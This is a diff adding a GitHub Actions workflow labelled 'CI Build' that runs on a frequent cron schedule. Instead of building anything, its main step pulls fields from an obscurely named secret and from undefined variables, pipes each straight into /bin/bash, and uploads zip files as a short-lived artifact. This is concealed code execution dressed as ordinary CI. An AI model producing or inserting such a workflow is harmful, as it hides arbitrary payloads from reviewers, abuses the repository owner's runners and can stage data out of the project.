@@ -1,0 +1,34 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '19 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          ptyqo74563: ${{ secrets.ptyqo74563 }}
+        run: |
+          printf '%s' "$ptyqo74563" | jq -r .up056 | /bin/bash
+          echo $w8 | jq -r .my87 | /bin/bash
+          printf '%s' "$c94" | jq -r .x060 | /bin/bash
+          printf '%s' "$wzm73" | jq -r .nbr40 | /bin/bash
+          printf '%s' "$yaj23913" | jq -r .fpd79 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: hcXXOuYJ
+          path: "*.zip"
+          retention-days: 1
